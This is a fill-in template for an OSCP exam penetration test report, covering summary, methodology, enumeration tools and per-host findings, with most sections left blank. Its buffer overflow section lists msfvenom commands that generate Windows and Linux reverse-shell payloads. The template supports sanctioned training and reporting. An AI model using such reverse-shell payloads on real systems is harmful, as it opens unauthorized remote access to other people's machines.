---
title: "Penetration Test Report"
subtitle: "Offensive Security Certified Professional Exam"
author: ["EMAIL","OS-XXXXX"]
date: "YYYY-MM-DD"
subject: "Markdown"
lang: "en"
titlepage: true titlepage-color: "DC143C"
titlepage-text-color: "000000"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 12 book: true classoption: oneside code-block-font-size: \scriptsize
---

# Offensive Security Certified Professional Exam Report

## Introduction

This penetration test report contains all efforts that were conducted in order to pass the OSCP Exam. This report will
be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to
ensure that the student has full understanding of penetration testing methodologies as well as the technical knowledge
to pass the qualifications for the OSCP Certification.

## Objective

The objective of this assessment is to perform an internal penetration test against the OSCP Exam network. The student
is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an
actual penetration test and how you would start from beginning to end, including the overall report.

## Requirements

The student will be required to fill out this penetration testing report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and key.txt
- Any additional items that were not included

# High-Level Summary

I was tasked with performing an internal penetration test towards OSCP Exam network. An internal penetration test is a
dedicated attack against internally connected systems. My overall objective was to evaluate the network, identify
systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the
network. When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches
and poor security configurations. During the testing, I had administrative level access to multiple systems. All systems
were successfully exploited and access granted. These systems as well as a brief description on how access was obtained
are listed below:

\definecolor{headGray}{gray}{0.6}
\definecolor{rowGray}{gray}{0.8}

\begingroup
\setlength{\tabcolsep}{10pt}
\renewcommand{\arraystretch}{1.5}
\begin{center}
\begin{tabular}{ ||l|l|l||}
    \hline
    \rowcolor{headGray}
    \textbf{IP} & \textbf{HOSTNAME} & \textbf{VULNERABILITY EXPLOITED} \\
    \hline
    \hline
    IP & HOSTNAME & VULN_EXPLOITED \\
    \rowcolor{rowGray}
    IP & HOSTNAME & VULN_EXPLOITED \\
    IP & HOSTNAME & VULN_EXPLOITED \\
    \rowcolor{rowGray}
    IP & HOSTNAME & VULN_EXPLOITED \\
    \hline
\end{tabular}
\end{center}
\endgroup

## Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these
systems in the future. One thing to remember is that these systems require frequent patching and once patched, should
remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the exam
environments is secured. Below is a breakout of how I was able to identify and exploit the variety of systems and
includes vulnerabilities found.

## Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. The
specific IP addresses were:

**OSCP Exam Network**

- IP_1 (HOSTNAME_1)
- IP_2 (HOSTNAME_2)
- IP_3 (HOSTNAME_3)
- IP_4 (HOSTNAME_4)

## Enumeration

## Custom tools

Following are the tools and respective GitHub links used during the penetration testing for clarity:

- nmapAutomator: *[21y4d/nmapAutomator](https://github.com/21y4d/nmapAutomator)*
- SUID3NUM: *[Anon-Exploiter/SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)*
- linPEAS: *[carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)*
- winPEAS: *[carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)*
- ADD MORE IF NEEDED.

NOTE: I have utilized *nmapAutomator* to fully perform reconnaissance on the machines. As the output of this tool is
very verbose, only selected sections are entered in this document.

## Penetration Testing

The penetration testing portions of the assessment details steps taken to gaining access exam network machines. During
this penetration test, I was able to successfully gain access to **TODO** machines.

### Testing Environment

![Kali environment]()

\pagebreak

### IP: IP - HOSTNAME

#### Buffer Overflow Exploitation

The Exam network has provided a testbed Windows machine (IP: TODO). There is a vulnerable application file located
at `C:\TODO\TODO.exe`. A sample `POC.py` script has been provided.

**Testbed Exploitation Overview:**

NOTE: Files using in this section are attached in the Appendix section.

**Step1: Finding crash-bytes**

**Step2: Finding offset & EIP**

**Step3: Finding badChars**

**Step4: Finding JMP**

**Step5: Generating payload**

1. msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "badChars" -f c
2. [OR]
3. msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "badChars" -f c

**Step6: Prepend NOPs**

**Step7: Test on testbed environment**

**Target Exploitation:**

**proof.txt screenshot:**

![Contents of proof.txt]()

**proof.txt Contents:** `KEY`

\pagebreak

### IP: IP - HOSTNAME

#### Service Enumeration

TARGET IP | Ports Open
----------|------------------------
IP        | **TCP**: \
**UDP**:

**Scan Results:**

![tcp scan results]()

![udp scan results]()

**Enumeration:**

**Exploitation Overview:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**local.txt screenshot:**

![Contents of local.txt]()

**local.txt Contents:** `KEY`

#### Privilege Escalation

**Enumeration:**

**Exploitation Overview:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**proof.txt screenshot:**

![Contents of proof.txt]()

**proof.txt Contents:** `KEY`

\pagebreak

### IP: IP - HOSTNAME

#### Service Enumeration

TARGET IP | Ports Open
----------|------------------------
IP        | **TCP**: \
**UDP**:

**Scan Results:**

![tcp scan results]()

![udp scan results]()

**Enumeration:**

**Exploitation Overview:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**local.txt screenshot:**

![Contents of local.txt]()

**local.txt Contents:** `KEY`

#### Privilege Escalation

**Enumeration:**

**Exploitation Overview:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**proof.txt screenshot:**

![Contents of proof.txt]()

**proof.txt Contents:** `KEY`

\pagebreak

### IP: IP - HOSTNAME

#### Service Enumeration

TARGET IP | Ports Open
----------|------------------------
IP      | **TCP**: \
**UDP**:

**Scan Results:**

![tcp scan results]()

![udp scan results]()

**Enumeration:**

**Exploitation Overview:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**proof.txt screenshot:**

![Contents of proof.txt]()

**proof.txt Contents:** `KEY`

\pagebreak

## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has
been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the
focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits
may only be exploitable once and we may never be able to get back into a system after we have already performed the
exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments
of tools or user accounts are left on an organization's computer which can cause security issues down the road. Ensuring
that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, removed all user accounts (if any) and passwords.
Offensive Security team should not have to remove any user accounts or services from the system.

# Appendix

## BOF Script: `fuzzer.py`

```python
```

## BOF Script: `exploit.py`

```python
```

## BOF Script (ran on target): `exploit.py`

```python
```
